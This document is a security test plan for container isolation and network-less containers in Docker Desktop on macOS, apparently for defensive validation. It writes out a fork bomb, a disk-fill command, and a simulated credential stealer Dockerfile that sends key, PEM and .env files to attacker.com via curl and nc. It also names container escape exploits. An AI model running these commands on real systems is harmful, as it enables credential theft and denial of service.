# ECI and Air-Gapped Container Security Test Plan

## 1. Overview

### Purpose
Test the security boundaries and host isolation provided by:
- **Enhanced Container Isolation (ECI)**: Uses a lightweight Linux VM to isolate containers from the macOS host
- **Air-gapped containers**: Containers with no network connectivity to prevent data exfiltration

### Test Environment
- **Host OS**: macOS (Docker Desktop)
- **Docker Desktop Version**: [To be documented]
- **Test Framework**: Bash scripts, Docker CLI
- **Monitoring Tools**: Docker Desktop dashboard, system logs, network monitors

---

## 2. ECI (Enhanced Container Isolation) Test Scenarios

### 2.1 Filesystem Isolation Tests

#### Test 2.1.1: Host Filesystem Access Prevention
**Objective**: Verify containers cannot access host filesystem beyond mounted volumes

**Steps**:
1. Start container with ECI enabled
2. Attempt to access common macOS paths:
   - `/Users/`
   - `/System/`
   - `/Applications/`
   - `/private/`
3. Attempt path traversal attacks from mounted volumes

**Expected Result**: All access attempts fail; only explicitly mounted volumes are accessible

**Attack Vectors**:
- Direct path access
- Symlink attacks
- `.dockerignore` bypass attempts
- Bind mount escape attempts

---

#### Test 2.1.2: Volume Mount Isolation
**Objective**: Verify mounted volumes are properly isolated and scoped

**Steps**:
1. Mount specific directory to container
2. Attempt to access parent directories via `..`
3. Attempt to create symlinks pointing outside mounted path
4. Try to remount with different permissions

**Expected Result**: Container confined to mounted directory scope

---

### 2.2 Process Isolation Tests

#### Test 2.2.1: Host Process Visibility
**Objective**: Verify containers cannot see or interact with host processes

**Steps**:
1. Start container with ECI
2. Run `ps aux` inside container
3. Attempt to use `/proc` to enumerate processes
4. Try to send signals to PIDs outside container namespace

**Expected Result**: Only container processes visible; host processes invisible

---

#### Test 2.2.2: Privileged Escalation Prevention
**Objective**: Verify privileged flags don't bypass ECI

**Steps**:
1. Run container with `--privileged` flag
2. Attempt kernel module loading
3. Try to access `/dev` devices
4. Attempt to modify system settings via `sysctl`

**Expected Result**: ECI maintains isolation even with privileged flag

---

### 2.3 Kernel and System Call Isolation

#### Test 2.3.1: Kernel Exploitation Attempts
**Objective**: Verify kernel vulnerabilities can't be exploited to escape

**Steps**:
1. Use known container escape techniques:
   - Dirty COW attack
   - Shocker exploit
   - RunC CVE-2019-5736
2. Attempt to load malicious kernel modules
3. Try to access raw devices

**Expected Result**: All exploits contained within VM boundary

---

#### Test 2.3.2: System Call Filtering
**Objective**: Verify dangerous syscalls are blocked

**Steps**:
1. Attempt syscalls like:
   - `reboot()`
   - `mount()`
   - `ptrace()` on non-child processes
2. Try to modify kernel parameters
3. Attempt to create new namespaces that escape isolation

**Expected Result**: Dangerous syscalls fail or are properly contained

---

### 2.4 Resource Exhaustion Tests

#### Test 2.4.1: CPU Bomb
**Objective**: Verify malicious CPU consumption doesn't crash host

**Steps**:
```bash
# Run fork bomb
:(){ :|:& };:
# Run CPU stress
while true; do :; done &
```

**Expected Result**: Container resource limits enforced; host remains responsive

---

#### Test 2.4.2: Memory Exhaustion
**Objective**: Verify OOM doesn't affect host

**Steps**:
```bash
# Allocate massive memory
stress --vm 10 --vm-bytes 10G
```

**Expected Result**: Container killed before host memory exhaustion

---

#### Test 2.4.3: Disk Fill Attack
**Objective**: Verify disk filling doesn't crash host

**Steps**:
```bash
# Fill container disk
dd if=/dev/zero of=/tmp/bigfile bs=1M count=100000
```

**Expected Result**: Container quota enforced; host disk unaffected

---

## 3. Air-Gapped Container Test Scenarios

### 3.1 Network Isolation Tests

#### Test 3.1.1: Outbound Connection Blocking
**Objective**: Verify no outbound network connections possible

**Steps**:
1. Run container with `--network none`
2. Attempt connections:
   ```bash
   curl https://google.com
   wget https://example.com
   ping 8.8.8.8
   nc -v google.com 443
   ```
3. Try DNS resolution
4. Attempt raw socket creation

**Expected Result**: All network operations fail

---

#### Test 3.1.2: Data Exfiltration Prevention
**Objective**: Verify malicious container cannot leak data

**Steps**:
1. Create sensitive data in air-gapped container
2. Attempt exfiltration via:
   - HTTP/HTTPS requests
   - DNS tunneling
   - ICMP tunneling
   - Side-channel attacks (timing)

**Expected Result**: No data leaves container

---

#### Test 3.1.3: Container-to-Container Communication
**Objective**: Verify air-gapped containers can't communicate with other containers

**Steps**:
1. Start multiple containers (some air-gapped, some not)
2. Attempt connections between them
3. Try to join other container networks

**Expected Result**: Air-gapped containers completely isolated

---

### 3.2 Combined ECI + Air-Gap Tests

#### Test 3.2.1: Multi-Layer Escape Attempts
**Objective**: Test combined isolation strength

**Steps**:
1. Run air-gapped container with ECI enabled
2. Simultaneously attempt:
   - Filesystem escape
   - Network exfiltration
   - Process injection
   - Kernel exploitation

**Expected Result**: All attacks fail; layers provide defense in depth

---

#### Test 3.2.2: Persistence Attempts
**Objective**: Verify malicious code can't persist across restarts

**Steps**:
1. Install malware in container
2. Stop and restart container
3. Check for persistence mechanisms:
   - Modified binaries
   - Scheduled tasks
   - Startup scripts

**Expected Result**: Container starts clean; no persistence outside volumes

---

## 4. Attack Simulation Scripts

### 4.1 Malicious Container Scenarios

#### Scenario 1: Crypto Miner
**Purpose**: Test resource isolation and detection

```dockerfile
FROM alpine
RUN apk add --no-cache curl
CMD while true; do \
  # Simulate mining
  openssl speed -multi $(nproc) & \
  # Try to spread
  curl -s http://169.254.169.254/latest/meta-data/ || true; \
  sleep 1; \
done
```

---

#### Scenario 2: Data Stealer
**Purpose**: Test data exfiltration prevention

```dockerfile
FROM alpine
RUN apk add --no-cache curl netcat-openbsd
CMD find / -name "*.key" -o -name "*.pem" -o -name "*.env" 2>/dev/null | \
  while read file; do \
    # Try various exfil methods
    curl -X POST -d @"$file" https://attacker.com/exfil || \
    nc attacker.com 9999 < "$file" || \
    true; \
  done
```

---

#### Scenario 3: Container Escape Attempt
**Purpose**: Test ECI boundary

```dockerfile
FROM alpine
RUN apk add --no-cache gcc musl-dev
COPY escape_exploit.c /tmp/
RUN cd /tmp && gcc escape_exploit.c -o exploit
CMD ["/tmp/exploit"]
```

---

## 5. Test Execution Framework

### 5.1 Automated Test Runner

```bash
#!/bin/bash
# test-runner.sh

RESULTS_DIR="./test-results-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$RESULTS_DIR"

run_test() {
  local test_name=$1
  local test_cmd=$2
  
  echo "Running: $test_name"
  
  {
    echo "=== Test: $test_name ==="
    echo "Started: $(date)"
    
    if eval "$test_cmd"; then
      echo "Result: PASS"
    else
      echo "Result: FAIL"
    fi
    
    echo "Completed: $(date)"
    echo ""
  } | tee "$RESULTS_DIR/$test_name.log"
}

# Execute all tests
run_test "eci_filesystem_isolation" "./tests/eci/filesystem_isolation.sh"
run_test "eci_process_isolation" "./tests/eci/process_isolation.sh"
run_test "airgap_network_isolation" "./tests/airgap/network_isolation.sh"
run_test "combined_isolation" "./tests/combined/multi_layer.sh"

# Generate summary report
./generate_report.sh "$RESULTS_DIR"
```

---

### 5.2 Monitoring and Validation

**Host-Side Monitoring**:
```bash
# Monitor during tests
- System calls: `sudo dtruss -p <docker_pid>`
- Network traffic: `sudo tcpdump -i any`
- File access: `sudo fs_usage -f filesys`
- Process tree: `pstree -p <docker_pid>`
```

**Container-Side Monitoring**:
```bash
# Inside container
- Network: `ip addr`, `netstat -tunlp`
- Processes: `ps aux`, `top`
- Filesystem: `df -h`, `mount`
- Capabilities: `capsh --print`
```

---

## 6. Success Criteria

### ECI Tests
- ✅ No host filesystem access beyond mounts
- ✅ Host processes invisible from container
- ✅ Kernel exploits contained within VM
- ✅ Resource limits enforced
- ✅ Privileged containers still isolated

### Air-Gap Tests
- ✅ Zero network connectivity (all protocols)
- ✅ No data exfiltration possible
- ✅ DNS resolution fails
- ✅ Container-to-container isolation maintained

### Combined Tests
- ✅ Multi-vector attacks fail
- ✅ No persistence across restarts
- ✅ Layered security effective
- ✅ Performance acceptable under attack

---

## 7. Reporting Template

```markdown
# Test Execution Report

**Date**: [DATE]
**Tester**: [NAME]
**Docker Desktop Version**: [VERSION]
**Host OS**: [OS VERSION]

## Test Summary
- Total Tests: X
- Passed: Y
- Failed: Z
- Skipped: W

## Failed Tests
| Test ID | Test Name | Failure Reason | Severity |
|---------|-----------|----------------|----------|
| 2.1.1   | Host FS Access | [Details] | Critical |

## Security Findings
1. [Finding description]
   - Impact: [High/Medium/Low]
   - Recommendation: [Action]

## Performance Impact
- CPU overhead: X%
- Memory overhead: Y MB
- Disk overhead: Z MB

## Recommendations
1. [Recommendation 1]
2. [Recommendation 2]
```

---

## 8. Next Steps

1. **Setup Phase**:
   - Document current Docker Desktop version
   - Enable ECI in Docker Desktop settings
   - Prepare test containers and scripts

2. **Execution Phase**:
   - Run baseline tests without ECI
   - Run tests with ECI enabled
   - Run air-gapped container tests
   - Run combined scenario tests

3. **Analysis Phase**:
   - Compare results
   - Document any successful attacks
   - Measure performance impact
   - Generate comprehensive report

4. **Remediation Phase**:
   - Report findings to Docker team
   - Implement additional hardening
   - Re-test failed scenarios
